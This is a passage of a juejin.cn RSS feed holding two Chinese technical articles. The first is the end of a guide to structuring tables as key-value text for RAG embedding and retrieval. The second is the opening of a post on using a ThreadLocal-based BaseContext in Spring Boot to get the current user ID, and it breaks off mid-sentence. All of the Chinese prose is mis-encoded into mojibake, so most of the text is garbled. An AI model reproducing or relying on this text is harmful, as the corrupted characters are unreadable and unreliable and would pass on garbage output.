1ã€å…¬å¸å†…éƒ¨ï¼ŒæŒ‰ç…§æ¥ç”µä¿¡æ¯åšå¥½ç›¸åº”çš„å·¥ä½œï¼ˆèŒ¶æ°´ã€ä¼šè®®ã€ç­‰å…¶ä»–å·¥ä½œï¼‰ï¼›\n 2ã€ä¸šåŠ¡å’¨è¯¢ï¼Œåšå¥½æ¥ç”µå’¨è¯¢å·¥ä½œï¼Œé‡è¦äº‹å®œè®¤çœŸè®°å½•å¹¶ä¼ è¾¾ç»™ç›¸å…³äººå‘˜ã€‚</td></tr></tbody></table>
<p>åŸºç¡€æ‹¼æ¥ç»“æœï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹  </span>
<span class="hljs-section">å·¥ä½œæ¨¡å—: å‰å°æ¥å¾…  </span>
<span class="hljs-section">ç±»å‹: å‰å°æ¥å¾…&amp;å’¨è¯¢è§£ç­”  </span>
<span class="hljs-section">å†…å®¹: ç€è£…å¹²å‡€æ•´æ´ï¼Œæ·¡å¦†ï¼Œç¤¼è²Œç”¨è¯­  </span>
<span class="hljs-section">æ ‡å‡†: 1. æ¥è®¿æ¥å¾…ï¼›2. æ¥å¾…æµç¨‹  </span>
<span class="hljs-section">æµç¨‹: æ¥è®¿æ¥å¾…: å®¢æˆ·æ¥è®¿...</span>
</code></pre>
<p><strong>é•¿æ–‡æœ¬ä¼˜åŒ–å¤„ç†</strong>ï¼š</p>
<p>æµç¨‹ä¸€æ ç”Ÿæˆå¥å­è¾ƒé•¿ï¼Œä¸é€‚åˆç›´æ¥åš token åŒ–åè¾“å…¥åˆ°å°æ¨¡å‹ä¸­ã€‚</p>
<p>éœ€è¦é’ˆå¯¹è¿™ç±»é•¿æ–‡æœ¬åˆ—ï¼ŒæŒ‰æ ‡ç‚¹ç¬¦å·ï¼ˆå¥å·ã€åˆ†å·ã€æ¢è¡Œç¬¦ï¼‰è¿›è¡Œè¯­ä¹‰åˆ‡åˆ†ï¼Œæ¯æ¡å­å¥å‡é™„åŠ å®Œæ•´ä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹  </span>
<span class="hljs-section">å·¥ä½œæ¨¡å—: å‰å°æ¥å¾…  </span>
<span class="hljs-section">å†…å®¹: ç€è£…å¹²å‡€æ•´æ´  </span>
<span class="hljs-section">å†…å®¹: æ·¡å¦†  </span>
<span class="hljs-section">å†…å®¹: ç¤¼è²Œç”¨è¯­  </span>
<span class="hljs-section">æµç¨‹: æ¥è®¿æ¥å¾…: å®¢æˆ·æ¥è®¿ï¼Œç™»è®°è®¿é—®ä¿¡æ¯  </span>
<span class="hljs-section">æµç¨‹: æ´¾å‘â€œè®¿å®¢è´´â€ç»™å¯¹æ–¹...</span>
</code></pre>
<p><strong>åˆ—ç±»å‹è¯†åˆ«æœºåˆ¶</strong>ï¼š</p>
<ul>
<li>æ ‡ç­¾å‹åˆ—ï¼ˆå¦‚"ç±»å‹"ã€"æ ‡å‡†"ï¼‰ï¼šçŸ­æ–‡æœ¬ï¼Œç›´æ¥æŒ‰"åˆ—å: å†…å®¹"æ‹¼æ¥</li>
<li>é•¿æ–‡æœ¬åˆ—ï¼ˆå¦‚"å†…å®¹"ã€"æµç¨‹"ï¼‰ï¼šå¤§æ®µæ–‡å­—ï¼ŒæŒ‰è¯­ä¹‰å•å…ƒæ‹†åˆ†åè¾“å‡º</li>
<li>åˆ¤æ–­é˜ˆå€¼ï¼šå•å…ƒæ ¼å¹³å‡é•¿åº¦ &gt; 50å­— â†’ è¯†åˆ«ä¸ºé•¿æ–‡æœ¬åˆ—</li>
</ul>
<h4 data-id="heading-19">ä¸ºä»€ä¹ˆä½¿ç”¨è¡¨æ ¼ç»“æ„åŒ–å½¢å¼æ¯”çº¯æ–‡æœ¬å¹³é“ºå½¢å¼å‘é‡åŒ–æ£€ç´¢æ•ˆæœæ›´å¥½</h4>
<h5 data-id="heading-20">ç»“æ„åŒ–è¡¨ç¤º</h5>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹  </span>
<span class="hljs-section">å·¥ä½œæ¨¡å—: å‰å°æ¥å¾…  </span>
<span class="hljs-section">ç±»å‹: å‰å°æ¥å¾…&amp;å’¨è¯¢è§£ç­”  </span>
<span class="hljs-section">å†…å®¹: ç€è£…å¹²å‡€æ•´æ´ï¼Œæ·¡å¦†ï¼Œç¤¼è²Œç”¨è¯­  </span>
<span class="hljs-section">æ ‡å‡†: 1. æ¥è®¿æ¥å¾…ï¼›2. æ¥å¾…æµç¨‹  </span>
<span class="hljs-section">æµç¨‹: æ¥è®¿æ¥å¾…: å®¢æˆ·æ¥è®¿...</span>
</code></pre>
<p>æ¯ä¸€é¡¹éƒ½åƒä¸€ä¸ª KVï¼ˆå­—æ®µå â†’ å€¼ï¼‰ï¼Œembedding æ¨¡å‹å¯ä»¥æ˜ç¡®çŸ¥é“ï¼š</p>
<ul>
<li>å“ªäº›æ˜¯èŒè´£ï¼ˆå†…å®¹ï¼‰</li>
<li>å“ªäº›æ˜¯æµç¨‹ï¼ˆæµç¨‹ï¼‰</li>
<li>å“ªäº›æ˜¯è§„èŒƒï¼ˆæ ‡å‡†ï¼‰</li>
<li>å±äºå“ªä¸ªæ¨¡å—ï¼ˆå·¥ä½œæ¨¡å—ï¼‰</li>
<li>å±äºå“ªä¸ªå¤§ç±»ï¼ˆè¡¨æ ¼æ ‡é¢˜ï¼‰</li>
</ul>
<p>ç»“æ„åŒ– â†’ è¯­ä¹‰è¾¹ç•Œæ˜ç¡® â†’ embedding çš„è¯­ä¹‰å¯†åº¦æ›´é«˜ â†’ æœç´¢æ›´å‡†</p>
<h5 data-id="heading-21">çº¯æ–‡æœ¬å¹³é“ºå½¢å¼</h5>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">å·¥ä½œå†…å®¹ï¼Œå·¥ä½œæ¨¡å—: å‰å°æ¥å¾… ï¼Œç±»å‹: å‰å°æ¥å¾…&amp;å’¨è¯¢è§£ç­”ï¼Œå†…å®¹: ç€è£…å¹²å‡€æ•´æ´ï¼Œæ·¡å¦†ï¼Œç¤¼è²Œç”¨è¯­ï¼Œæ ‡å‡†: 1. æ¥è®¿æ¥å¾…ï¼›2. æ¥å¾…æµç¨‹ ï¼Œæµç¨‹: æ¥è®¿æ¥å¾…: å®¢æˆ·æ¥è®¿...</span>
</code></pre>
<p>æ‰€æœ‰ä¿¡æ¯å †åœ¨ä¸€èµ·ï¼Œæ¨¡å‹éš¾ä»¥åˆ¤æ–­ï¼š</p>
<ul>
<li>å“ªä¸€éƒ¨åˆ†æ˜¯â€œå†…å®¹â€</li>
<li>å“ªä¸€éƒ¨åˆ†æ˜¯â€œæµç¨‹â€</li>
<li>å“ªä¸€éƒ¨åˆ†æ˜¯â€œæ ‡å‡†â€</li>
</ul>
<p>è¿™ä¼šå¸¦æ¥ 2 ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>embedding è¢«å¤§é‡å¼±ç›¸å…³è¯ç¨€é‡Š</li>
<li>æŸ¥è¯¢æ—¶éš¾ä»¥ç²¾å‡†åŒ¹é…åˆ°å¯¹åº”å­—æ®µ</li>
</ul>
<p>æœ€ç»ˆå¯¼è‡´ï¼šå¬å›å·®ã€å™ªå£°å¤§ã€ç²¾ç¡®åº¦ä½</p>
<h5 data-id="heading-22">å†ä¼˜åŒ–å¤„ç†</h5>
<p><strong>1. å°†è¡¨æ ¼è½¬ä¸ºç»“æ„åŒ– KV æ ¼å¼</strong>
æ¯è¡Œå½¢æˆä¸€æ¡å‘é‡åŒ–å¯¹è±¡ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹ | å­—æ®µ: å·¥ä½œæ¨¡å— | å€¼: å‰å°æ¥å¾…</span>
<span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹ | å­—æ®µ: ç±»å‹ | å€¼: å‰å°æ¥å¾…&amp;å’¨è¯¢è§£ç­”</span>
<span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹ | å­—æ®µ: å†…å®¹ | å€¼: ç€è£…å¹²å‡€æ•´æ´</span>
<span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹ | å­—æ®µ: å†…å®¹ | å€¼: æ·¡å¦†</span>
<span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹ | å­—æ®µ: å†…å®¹ | å€¼: ç¤¼è²Œç”¨è¯­</span>
<span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹ | å­—æ®µ: æ ‡å‡† | å€¼: æ¥è®¿æ¥å¾…</span>
<span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹ | å­—æ®µ: æ ‡å‡† | å€¼: æ¥å¾…æµç¨‹</span>
<span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹ | å­—æ®µ: æµç¨‹ | å€¼: æ¥è®¿æ¥å¾…: å®¢æˆ·æ¥è®¿...</span>
</code></pre>
<p>æ¯æ¡ embedding éƒ½å…·å¤‡å®Œæ•´è¯­ä¹‰ï¼Œä¸ä¼šä¸¢ä¸Šä¸‹æ–‡ã€‚</p>
<p><strong>2. å¯¹æ¯æ¡æ•°æ®å‰æ‹¼æ¥ä¸Šä¸‹æ–‡</strong>
æ¯”å¦‚ï¼š</p>
<pre><code class="hljs">å·¥ä½œå†…å®¹ &gt; å†…å®¹: æ·¡å¦†
</code></pre>
<p>æ‹¼æ¥åçš„ä¼˜åŠ¿ï¼š</p>
<ul>
<li>å¢å¼ºè¯­ä¹‰å®Œæ•´åº¦ï¼ˆé¿å…å‘é‡ç¢ç‰‡ï¼‰</li>
<li>æ£€ç´¢â€œå®¢æœå²—ä½æ·¡å¦†è¦æ±‚â€æ—¶å‡†ç¡®ç‡èƒ½å¤§å¹…æé«˜</li>
</ul>
<h3 data-id="heading-23">ç¼ºå¤±è¡¨å¤´è¡¨æ ¼</h3>
<p><strong>å¤„ç†ç­–ç•¥</strong>ï¼š</p>
<ul>
<li>åˆ—åè¡¥å…¨ï¼šä¸ºæ— è¡¨å¤´åˆ—ç”Ÿæˆé€šç”¨æ ‡è¯†ã€‚è‹±æ–‡æ¨¡å¼ï¼šColumn 1, Column 2, Column 3...ï¼›ä¸­æ–‡æ¨¡å¼ï¼šåˆ—1, åˆ—2, åˆ—3...</li>
<li>å†…å®¹å¢å¼ºï¼šç»“åˆé¦–è¡Œæ•°æ®è¿›è¡Œåˆ—åæ¨æµ‹ï¼ˆå¯é€‰ï¼‰</li>
<li>æ ¼å¼ç»Ÿä¸€ï¼šä¿æŒ"è™šæ‹Ÿåˆ—å: å†…å®¹"çš„ç»“æ„åŒ–æ ¼å¼</li>
</ul>
<p>è¾“å‡ºç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">è¡¨æ ¼æ ‡é¢˜: å·¥ä½œå†…å®¹</span>
<span class="hljs-section">åˆ—1: å‰å°æ¥å¾…</span>
<span class="hljs-section">åˆ—2: å‰å°æ¥å¾…&amp;å’¨è¯¢è§£ç­”</span>
<span class="hljs-section">åˆ—3: ç€è£…å¹²å‡€æ•´æ´ï¼Œæ·¡å¦†ï¼Œç¤¼è²Œç”¨è¯­</span>
</code></pre>
<h3 data-id="heading-24">ç¼ºå¤±æ ‡é¢˜è¡¨æ ¼</h3>
<p>è¡¨æ ¼æ ‡é¢˜çš„é‡è¦æ€§å·²ç»åœ¨è¯†åˆ«è¡¨æ ¼æ ‡é¢˜æ¨¡å—ä¸­ä»‹ç»è¿‡ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚å½“æ²¡æœ‰è¡¨æ ¼æ ‡é¢˜æ—¶ï¼Œéœ€è¦æ ¹æ®å†…å®¹è¿›è¡Œè™šæ‹Ÿæ ‡é¢˜ç”Ÿæˆã€‚ç”Ÿæˆç­–ç•¥å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>è¡¨å¤´æ¨æµ‹ç»“æœï¼ˆå¦‚æœæœ‰ï¼‰</strong>ï¼šç»“åˆè¡¨å¤´è¡Œå’Œç¬¬ä¸€è¡Œå†…å®¹ï¼Œé€šè¿‡å¤§æ¨¡å‹æˆ–è€…è¯­ä¹‰åˆ†æç”Ÿæˆå¾—åˆ°è¡¨æ ¼ä¸»é¢˜æ‘˜è¦ã€‚</li>
<li><strong>è¡¨æ ¼å†…éƒ¨å…±åŒè¯ï¼ˆå…³é”®è¯èšåˆï¼‰</strong>ï¼šå–æ‰€æœ‰è¡Œï¼Œåš TF-IDF/LDA/embedding èšç±»ï¼Œæå–é«˜é¢‘è¯ï¼šâ€œæµç¨‹ã€å·¥ä½œå†…å®¹ã€èŒè´£ã€æ£€æŸ¥ã€æ ‡å‡†ã€è§„èŒƒã€é¡¹ç›®ã€è´¹ç”¨ã€æ¸…å•ã€äººå‘˜ã€ä»»åŠ¡â€ç­‰ã€‚ç”Ÿæˆè¡¨è¿°ï¼šè¯¥è¡¨æ ¼æ€»ä½“å±•ç¤ºäº†ä¸ã€xxxã€‘ç›¸å…³çš„å†…å®¹ï¼ŒåŒ…æ‹¬ã€è‹¥å¹²åˆ—ä¸»é¢˜ã€‘ã€‚</li>
<li><strong>è¡¨æ ¼ä½ç½®ï¼ˆé¡µç ã€ä¸Šä¸€æ®µæ–‡æœ¬ï¼‰</strong>ï¼šå¦‚æœ OCR èƒ½æä¾›æ‰€åœ¨é¡µçš„é‚»è¿‘æ–‡æœ¬ï¼Œå¯ç”¨äºç”Ÿæˆâ€œæ¨æµ‹æ ‡é¢˜â€ã€‚ä¾‹å¦‚ä¸Šä¸€è¡Œæ˜¯ï¼šååŠ©ç§˜ä¹¦å·¥ä½œèŒè´£ï¼Œå¯è‡ªåŠ¨ç”Ÿæˆè¡¨æ ¼çš„â€œè™šæ‹Ÿæ ‡é¢˜â€ï¼šè¡¨æ ¼ä¸»é¢˜ï¼šååŠ©ç§˜ä¹¦å·¥ä½œèŒè´£çš„åˆ†é¡¹å†…å®¹</li>
</ul>
<h2 data-id="heading-25">å°¾è¨€</h2>
<p>é€šè¿‡æœ¬æ–‡ï¼Œè¯¦ç»†æ¢³ç†äº†åœ¨ RAG ä¸­å¤„ç†è¡¨æ ¼çš„æ ¸å¿ƒæ–¹æ³•â€”â€”ä»æ ‡é¢˜è¯†åˆ«ã€è¡¨å¤´æ¨æ–­ï¼Œåˆ°å†…å®¹ç»“æ„åŒ–çš„æ•´ä½“æµç¨‹ã€‚æ— è®ºæ˜¯å®Œæ•´ç»“æ„è¡¨æ ¼ã€ç¼ºå¤±è¡¨å¤´ï¼Œè¿˜æ˜¯ç¼ºå¤±æ ‡é¢˜çš„è¡¨æ ¼ï¼Œéƒ½å¯ä»¥é€šè¿‡å¤šç­–ç•¥åˆ¤æ–­ä¸è¯­ä¹‰å¢å¼ºï¼Œå®ç°æ›´é«˜è´¨é‡çš„å‘é‡åŒ–è¡¨ç¤ºå’Œæ£€ç´¢æ•ˆæœã€‚</p>
<p>ç„¶è€Œï¼Œæœ¬æ–‡çš„ç­–ç•¥ä¸»è¦é’ˆå¯¹å•çº§è¡¨å¤´å’Œå¸¸è§„è¡¨æ ¼ç»“æ„ã€‚å¯¹äºå¤šçº§è¡¨å¤´ã€äº¤å‰è¡¨ã€å¤æ‚åˆå¹¶å•å…ƒæ ¼ç­‰åœºæ™¯ï¼Œè¡¨æ ¼è§£æçš„éš¾åº¦å’Œä¸ç¡®å®šæ€§éƒ½ä¼šæ˜¾è‘—å¢åŠ ï¼Œç°æœ‰æ–¹æ³•å¯èƒ½æ— æ³•å®Œå…¨è¦†ç›–æ‰€æœ‰å¤æ‚æƒ…å†µã€‚</p>
<p>å°†åœ¨åç»­æ›´æ–°ä¸­æ¨å‡ºé’ˆå¯¹å¤šçº§è¡¨å¤´ä¸å¤æ‚è¡¨æ ¼çš„ä¸“é¡¹å¤„ç†æŒ‡å—ï¼ŒåŒ…æ‹¬ï¼šå¤šçº§è¡¨å¤´è‡ªåŠ¨è¯†åˆ«ä¸å±‚çº§è¯­ä¹‰é‡å»ºï¼Œäº¤å‰åˆå¹¶å•å…ƒæ ¼çš„è¡Œåˆ—æ˜ å°„ç­–ç•¥ï¼Œè¡¨æ ¼å…¨å±€ä¸Šä¸‹æ–‡å¢å¼ºä¸å¤æ‚åˆ—ç±»å‹è¯†åˆ«ï¼Œè®© RAG å¯¹å¤æ‚è¡¨æ ¼ä¹Ÿèƒ½åšåˆ°â€œè¯»å¾—æ‡‚ã€ç”¨å¾—å¥½â€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[BaseContextï¼šå¦‚ä½•åœ¨Serviceå±‚â€œéš”ç©ºå–ç‰©â€è·å–å½“å‰ç™»å½•ç”¨æˆ·IDï¼Ÿ]]></title>    <link>https://juejin.cn/post/7581666412021088265</link>    <guid>https://juejin.cn/post/7581666412021088265</guid>    <pubDate>2025-12-09T09:16:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581666412021088265" data-draft-id="7581667332306452518" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="BaseContextï¼šå¦‚ä½•åœ¨Serviceå±‚â€œéš”ç©ºå–ç‰©â€è·å–å½“å‰ç™»å½•ç”¨æˆ·IDï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-09T09:16:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ShaneD771"/> <meta itemprop="url" content="https://juejin.cn/user/2482077907032171"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            BaseContextï¼šå¦‚ä½•åœ¨Serviceå±‚â€œéš”ç©ºå–ç‰©â€è·å–å½“å‰ç™»å½•ç”¨æˆ·IDï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2482077907032171/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ShaneD771
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:16:36.000Z" title="Tue Dec 09 2025 09:16:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨åšSpring Boot çš„ Web é¡¹ç›®æ—¶ï¼Œåœ¨ Controller æˆ– Service å±‚ç»å¸¸ä¼šçœ‹åˆ°è¿™æ ·ä¸€è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// åœ¨ Service å±‚ç›´æ¥è·å–å½“å‰ç™»å½•ç”¨æˆ·çš„ID 
Long <span class="hljs-attr">userId</span> = BaseContext.getCurrentId()<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™å°±å¾ˆç¥å¥‡äº†ï¼š</p>
<ol>
<li><strong>æ²¡æœ‰ä¼ å‚</strong>ï¼šController è°ƒç”¨ Service æ—¶ï¼Œå¹¶æ²¡æœ‰æŠŠ <code>userId</code> ä½œä¸ºå‚æ•°ä¼ è¿›æ¥</li>
<li><strong>æ²¡æœ‰æŸ¥åº“</strong>ï¼šè¿™ä¸€è¡Œä»£ç ä¹Ÿæ²¡æœ‰å»æŸ¥è¯¢æ•°æ®åº“</li>
<li><strong>æ•°æ®å‡†ç¡®</strong>ï¼šå®ƒæ€»æ˜¯èƒ½ç²¾å‡†åœ°æ‹¿åˆ°å½“å‰å‘é€è¯·æ±‚çš„é‚£ä¸ªç”¨æˆ·çš„ IDï¼Œå¼ ä¸‰å‘è¯·æ±‚æ‹¿åˆ°å¼ ä¸‰ï¼Œæå››å‘è¯·æ±‚æ‹¿åˆ°æå››ï¼Œäº’ä¸å¹²æ‰°</li>
</ol>
<p>å®ƒæ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Ÿ</p>
<p>æœ‰ä¸¤ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼šThreadLocal å’Œ Tomcat çš„â€œä¸€è¯·æ±‚ä¸€çº¿ç¨‹â€æ¨¡å‹ã€‚</p>
<h2 data-id="heading-0">1.å®¹å™¨ï¼šThreadLocal (çº¿ç¨‹å±€éƒ¨å˜é‡)</h2>
<p>BaseContext åªæ˜¯ä¸€ä¸ªåŒ…è£…ç±»ï¼Œå®ƒå†…éƒ¨çš„æ ¸å¿ƒæ˜¯ JDK æä¾›çš„ ThreadLocalã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">BaseContext</span> {
    <span class="hljs-comment">// æ ¸å¿ƒï¼šThreadLocal å¯¹è±¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;Long&gt; threadLocal = <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;();

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCurrentId</span>(<span class="hljs-params">Long id</span>)</span> {
        threadLocal.<span class="hljs-keyword">set</span>(id); <span class="hljs-comment">// å­˜å…¥</span>
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Long <span class="hljs-title">getCurrentId</span>()</span> {
        <span class="hljs-keyword">return</span> threadLocal.<span class="hljs-keyword">get</span>(); <span class="hljs-comment">// å–å‡º</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">removeCurrentId</span>()</span> {
        threadLocal.<span class="hljs-keyword">remove</span>(); <span class="hljs-comment">// æ¸…é™¤</span>
    }
}
</code></pre>
<p>ThreadLocal çš„ä½œç”¨ï¼š</p>
<p>å½“æˆ‘ä»¬åœ¨ çº¿ç¨‹ A ä¸­å¾€ ThreadLocal å­˜å…¥æ•°æ®æ—¶ï¼Œåªæœ‰ çº¿ç¨‹ A èƒ½å–å‡ºæ¥</p>
<p>çº¿ç¨‹ B å³ä½¿è®¿é—®åŒä¸€ä¸ªå˜é‡ï¼Œä¹Ÿå®Œå…¨æ‘¸ä¸åˆ° çº¿ç¨‹ A çš„æ•°æ®</p>
<p>è¿™å°±æ˜¯çº¿ç¨‹éš”ç¦»ï¼ˆThread Safetyï¼‰</p>
<h2 data-id="heading-1">2.ç¯å¢ƒï¼šTomcat çš„â€œä¸€è¯·æ±‚ä¸€çº¿ç¨‹â€æ¨¡å‹</h2>
<p>Spring Boot å†…ç½®çš„ Web æœåŠ¡å™¨é€šå¸¸æ˜¯ Tomcatã€‚Tomcat å¤„ç†è¯·æ±‚çš„æœºåˆ¶æ˜¯ï¼šOne Request, One Thread ï¼ˆä¸€ä¸ª HTTP è¯·æ±‚ï¼Œç”±ä¸€ä¸ªç‹¬ç«‹çš„çº¿ç¨‹å…¨ç¨‹è´Ÿè´£ï¼‰</p>
<p>å½“ä¸€ä¸ªç”¨æˆ·å‘èµ·è¯·æ±‚ï¼ˆæ¯”å¦‚â€œæ·»åŠ è´­ç‰©è½¦â€ï¼‰æ—¶ï¼š</p>
